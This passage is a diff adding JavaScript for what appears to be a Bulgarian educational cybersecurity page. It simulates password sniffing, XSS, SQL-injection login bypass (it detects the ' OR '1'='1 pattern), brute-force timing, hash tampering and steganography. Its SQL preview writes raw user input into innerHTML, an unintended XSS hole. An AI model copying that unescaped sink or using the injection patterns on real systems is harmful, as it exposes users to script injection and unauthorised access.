+            document.getElementById('sound-icon').className = soundEnabled ? 'fa-solid fa-volume-high' : 'fa-solid fa-volume-xmark text-slate-500';
+        }
+        function playTone(freq, type = 'sine', duration = 0.08, vol = 0.06) {
+            if (!soundEnabled) return;
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                gain.gain.setValueAtTime(vol, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch (e) {}
+        }
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(() => {});
+            else document.exitFullscreen().catch(() => {});
+        }
+
+        const bgCanvas = document.getElementById('matrix-bg');
+        const bgCtx = bgCanvas.getContext('2d');
+        function resizeBg() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
+        resizeBg();
+        window.addEventListener('resize', resizeBg);
+        const drops = Array(Math.floor(window.innerWidth / 24)).fill(1);
+        setInterval(() => {
+            bgCtx.fillStyle = 'rgba(2, 6, 23, 0.14)';
+            bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
+            bgCtx.fillStyle = '#10b981';
+            bgCtx.font = '14px JetBrains Mono';
+            drops.forEach((y, i) => {
+                bgCtx.fillText(Math.random() > 0.5 ? '1' : '0', i * 24, y * 24);
+                if (y * 24 > bgCanvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }, 75);
+
+        // --- MITM ---
+        let tlsActive = false;
+        function toggleTls() {
+            tlsActive = !tlsActive;
+            const btn = document.getElementById('tls-btn');
+            const pkt = document.getElementById('packet-badge');
+            const dump = document.getElementById('sniffer-dump');
+            const hacker = document.getElementById('mitm-hacker-icon');
+            if (tlsActive) {
+                btn.textContent = 'Протокол: HTTPS / TLS 1.3 (AES-256)';
+                btn.className = 'px-4 py-2 rounded-xl bg-emerald-600/25 border border-emerald-500/50 text-emerald-300 font-mono text-xs sm:text-sm font-black';
+                pkt.textContent = '0x9F8A...E41B';
+                pkt.className = 'packet-dot px-3 py-1 rounded-lg bg-emerald-500 text-slate-950 font-mono text-xs font-bold';
+                hacker.className = 'w-14 h-14 mx-auto rounded-full bg-slate-800 border-2 border-slate-700 flex items-center justify-center text-slate-500 text-xl';
+                dump.className = 'bg-black p-4 rounded-2xl border border-emerald-500/30 font-mono text-xs sm:text-sm text-emerald-300';
+                dump.innerHTML = `[TLS 1.3 ENCRYPTED] Криптографски шум: <strong>8f94e2b10c77a3d91f4e8c02b9a17f...</strong>`;
+                playTone(740, 'sine', 0.14);
+            } else {
+                btn.textContent = 'Протокол: HTTP (Незащитен)';
+                btn.className = 'px-4 py-2 rounded-xl bg-rose-600/25 border border-rose-500/50 text-rose-300 font-mono text-xs sm:text-sm font-black';
+                pkt.textContent = 'PASS=TajnaParola2026';
+                pkt.className = 'packet-dot px-3 py-1 rounded-lg bg-rose-500 text-white font-mono text-xs font-bold';
+                hacker.className = 'w-14 h-14 mx-auto rounded-full bg-rose-500/20 border-2 border-rose-500/60 flex items-center justify-center text-rose-400 text-xl';
+                dump.className = 'bg-black p-4 rounded-2xl border border-slate-800 font-mono text-xs sm:text-sm text-rose-300';
+                dump.innerHTML = `[WIRESHARK] POST /login HTTP/1.1 | Payload: <strong>user=a.zeynev&amp;pass=TajnaParola2026</strong>`;
+                playTone(210, 'sawtooth', 0.14);
+            }
+        }
+
+        // --- XSS ---
+        let xssSanitized = false;
+        function toggleXssShield() {
+            xssSanitized = !xssSanitized;
+            const btn = document.getElementById('xss-shield-btn');
+            btn.textContent = xssSanitized ? 'XSS Филтър: ON (Sanitized)' : 'XSS Филтър: OFF (Уязвим)';
+            btn.className = xssSanitized
+                ? 'px-4 py-2 rounded-xl bg-emerald-600/25 border border-emerald-500/50 text-emerald-300 font-mono text-xs sm:text-sm font-black'
+                : 'px-4 py-2 rounded-xl bg-rose-600/25 border border-rose-500/50 text-rose-300 font-mono text-xs sm:text-sm font-black';
+        }
+        function runXssDemo() {
+            const val = document.getElementById('xss-input').value;
+            const out = document.getElementById('xss-output');
+            if (!xssSanitized && /<script/i.test(val)) {
+                playTone(180, 'sawtooth', 0.22);
+                out.className = 'bg-rose-950/70 p-4 rounded-2xl border border-rose-500 font-mono text-xs sm:text-sm text-rose-200';
+                out.innerHTML = `<strong class="text-rose-400">[XSS EXECUTED!]</strong> Скриптът се изпълни и изпрати бисквитката <code>SESSION_ID=9f8a7b6c5d4e_ADMIN</code> към атакуващия!`;
+            } else {
+                playTone(700, 'sine', 0.14);
+                const escaped = val.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                out.className = 'bg-emerald-950/50 p-4 rounded-2xl border border-emerald-500/40 font-mono text-xs sm:text-sm text-emerald-300';
+                out.innerHTML = `<strong>[SANITIZED]</strong> Обезвреден като текст: <code>${escaped}</code>`;
+            }
+        }
+
+        // --- SQLi ---
+        let sqliProtected = false;
+        function toggleSqliDefense() {
+            sqliProtected = !sqliProtected;
+            const btn = document.getElementById('sqli-shield-btn');
+            btn.textContent = sqliProtected ? 'Сървър: ЗАЩИТЕН (Prepared Statements)' : 'Сървър: УЯЗВИМ (String Concat)';
+            btn.className = sqliProtected
+                ? 'px-4 py-2 rounded-xl bg-emerald-600/25 border border-emerald-500/50 text-emerald-300 font-mono text-xs sm:text-sm font-black'
+                : 'px-4 py-2 rounded-xl bg-rose-600/25 border border-rose-500/50 text-rose-300 font-mono text-xs sm:text-sm font-black';
+            updateSqlPreview();
+        }
+        function updateSqlPreview() {
+            const u = document.getElementById('sqli-user').value;
+            const box = document.getElementById('sql-live-query');
+            box.innerHTML = sqliProtected
+                ? `<span class="text-emerald-400">PREPARE stmt FROM</span> "SELECT * FROM users WHERE username = ? AND password = ?";`
+                : `SELECT * FROM users WHERE username = '<span class="text-rose-400 font-bold">${u}</span>' AND password = '********';`;
+        }
+        function executeSqliLogin() {
+            const u = document.getElementById('sqli-user').value;
+            const res = document.getElementById('sqli-result-box');
+            const bypass = /('|")\s*OR\s+('1'='1'|1=1)/i.test(u);
+            if (!sqliProtected && bypass) {
+                playTone(170, 'sawtooth', 0.22);
+                res.className = 'p-4 rounded-2xl bg-rose-950/70 border border-rose-500 font-mono text-xs sm:text-sm text-rose-200';
+                res.innerHTML = `<strong class="text-rose-400">[AUTH BYPASS SUCCESS!]</strong> Влязохте като ADMINISTRATOR без парола!`;
+            } else {
+                playTone(720, 'sine', 0.14);
+                res.className = 'p-4 rounded-2xl bg-emerald-950/50 border border-emerald-500/40 font-mono text-xs sm:text-sm text-emerald-300';
+                res.textContent = sqliProtected ? '[BLOCKED BY PREPARED STATEMENT] Атаката е неутрализирана!' : 'Грешно име или парола.';
+            }
+        }
+
+        // --- BRUTE FORCE ---
+        let attackTimer = null;
+        function formatTime(sec) {
+            if (sec < 1) return (sec * 1000).toFixed(0) + ' мс';
+            if (sec < 60) return sec.toFixed(1) + ' сек.';
+            if (sec < 3600) return (sec / 60).toFixed(1) + ' мин.';
+            if (sec < 86400) return (sec / 3600).toFixed(1) + ' часа';
+            if (sec < 31536000) return (sec / 86400).toFixed(0) + ' дни';
+            const y = sec / 31536000;
+            return y < 1e6 ? y.toFixed(0) + ' години' : (y / 1e6).toFixed(1) + ' млн. години';
+        }
+        function analyzePassword() {
+            const pwd = document.getElementById('pass-input').value;
+            let pool = 0;
+            if (/[a-zа-я]/.test(pwd)) pool += 26;
+            if (/[A-ZА-Я]/.test(pwd)) pool += 26;
+            if (/[0-9]/.test(pwd)) pool += 10;
+            if (/[^a-zA-Zа-яА-Я0-9]/.test(pwd)) pool += 32;
+            const entropy = pwd.length && pool ? pwd.length * Math.log2(pool) : 0;
+            const combos = pwd.length && pool ? Math.pow(pool, pwd.length) : 0;
+            document.getElementById('entropy-pill').textContent = entropy.toFixed(1) + ' bits';
+            document.getElementById('crack-time').textContent = pwd.length ? '~ ' + formatTime((combos / 2) / 1e11) : '—';
+        }
+        function launchAttack() {
+            const pwd = document.getElementById('pass-input').value;
+            if (!pwd) return;
+            clearInterval(attackTimer);
+            let step = 0;
+            const bar = document.getElementById('attack-bar');
+            const out = document.getElementById('console-lines');
+            attackTimer = setInterval(() => {
+                step++;
+                bar.style.width = (step * 5) + '%';
+                out.textContent = `> [GPU-CLUSTER] Проверка на комбинации: ${(step * 5e9).toExponential(2)}...`;
+                if (step >= 20) {
+                    clearInterval(attackTimer);
+                    out.textContent = pwd.length < 15 ? `> [CRACKED!] Паролата "${pwd}" е разбита!` : `> [DEFENDED!] Неразбиваема в реален срок!`;
+                }
+            }, 50);
+        }
+
+        // --- SHA-256 ---
+        const origDoc = 'ИЗПИТЕН ПРОТОКОЛ № 2026-08 | Ученик: Георги Димитров (XII клас) | Крайна оценка: Среден (3.50)';
+        let origBits = '';
+        async function shaHex(s) {
+            const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
+            return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
+        }
+        function toBits(h) { return h.split('').map(c => parseInt(c, 16).toString(2).padStart(4, '0')).join(''); }
+        async function initSha() { origBits = toBits(await shaHex(origDoc)); updateAvalanche(); }
+        async function updateAvalanche() {
+            const bits = toBits(await shaHex(document.getElementById('doc-editor').value));
+            const grid = document.getElementById('bit-grid');
+            grid.innerHTML = '';
+            let diff = 0;
+            for (let i = 0; i < 256; i++) {
+                const ch = bits[i] !== origBits[i];
+                if (ch) diff++;
+                const d = document.createElement('div');
+                d.className = ch ? 'h-2.5 rounded-sm bg-rose-500' : 'h-2.5 rounded-sm bg-emerald-500/75';
+                grid.appendChild(d);
+            }
+            const c = document.getElementById('bit-diff-counter');
+            c.textContent = `${diff} / 256 бита променени (${((diff / 256) * 100).toFixed(1)}%)`;
+            c.className = diff ? 'text-rose-400 font-bold' : 'text-emerald-400 font-bold';
+        }
+        function simulateTamper() {
+            document.getElementById('doc-editor').value = origDoc.replace('Среден (3.50)', 'Отличен (6.00)');
+            playTone(190, 'sawtooth', 0.2);
+            updateAvalanche();
+        }
+        function restoreDoc() { document.getElementById('doc-editor').value = origDoc; updateAvalanche(); }
+
+        // --- STEGANOGRAPHY ---
+        const sc = document.getElementById('stego-canvas');
+        const sctx = sc.getContext('2d', { willReadFrequently: true });
+        let snap = null;
+        function drawStegoCover() {
+            const g = sctx.createLinearGradient(0, 0, 300, 180);
+            g.addColorStop(0, '#0f172a'); g.addColorStop(1, '#065f46');
+            sctx.fillStyle = g; sctx.fillRect(0, 0, 300, 180);
+            sctx.fillStyle = '#34d399'; sctx.font = 'bold 15px JetBrains Mono';
+            sctx.fillText('CYBERMATH STEGO PNG', 55, 95);
+            snap = sctx.getImageData(0, 0, 300, 180);
+        }
+        function loadUserImage(e) {
+            const f = e.target.files[0]; if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => {
+                const img = new Image();
+                img.onload = () => {
+                    sc.width = 300; sc.height = 180;
+                    sctx.drawImage(img, 0, 0, 300, 180);
+                    snap = sctx.getImageData(0, 0, 300, 180);
+                    decodeStego();
+                };
+                img.src = ev.target.result;
+            };
+            r.readAsDataURL(f);
+        }
+        function encodeStego() {
+            if (snap) sctx.putImageData(snap, 0, 0);
+            const bytes = new TextEncoder().encode(document.getElementById('secret-text').value + '###END###');
+            const id = sctx.getImageData(0, 0, sc.width, sc.height);
+            let bi = 0;
+            for (let i = 0; i < bytes.length; i++) {
+                for (let b = 7; b >= 0; b--) {
+                    const ch = Math.floor(bi / 3) * 4 + (bi % 3);
+                    if (ch < id.data.length) id.data[ch] = (id.data[ch] & 0xFE) | ((bytes[i] >> b) & 1);
+                    bi++;
+                }
+            }
+            sctx.putImageData(id, 0, 0);
+            playTone(680, 'sine', 0.14);
+            document.getElementById('decoded-output').textContent = 'Тайното послание е вградено в пикселите! Натиснете „Сканирай и прочети“.';
+        }
+        function decodeStego() {
+            const d = sctx.getImageData(0, 0, sc.width, sc.height).data;
+            const out = []; let cb = 0, bc = 0;
+            for (let bi = 0; bi < Math.min(12000, d.length); bi++) {
+                const ch = Math.floor(bi / 3) * 4 + (bi % 3);
+                cb = (cb << 1) | (d[ch] & 1); bc++;
+                if (bc === 8) {
+                    out.push(cb); cb = 0; bc = 0;
+                    const txt = new TextDecoder().decode(new Uint8Array(out));
+                    if (txt.endsWith('###END###')) {
+                        playTone(880, 'sine', 0.16);
+                        document.getElementById('decoded-output').textContent = 'ОТКРИТО ПОСЛАНИЕ: ' + txt.replace('###END###', '');
+                        return;
+                    }
+                }
+            }
+            document.getElementById('decoded-output').textContent = 'Няма открито скрито съобщение в тази снимка.';
+        }
+        function downloadStegoPng() {
+            const a = document.createElement('a');
+            a.download = 'cybermath-secret.png';
+            a.href = sc.toDataURL('image/png');
+            a.click();
+        }
+
+        // Init all
+        updateSqlPreview();
+        analyzePassword();
+        initSha();
+        drawStegoCover();
+        renderFinalExam();
+    </script>
+</body>
+</html>
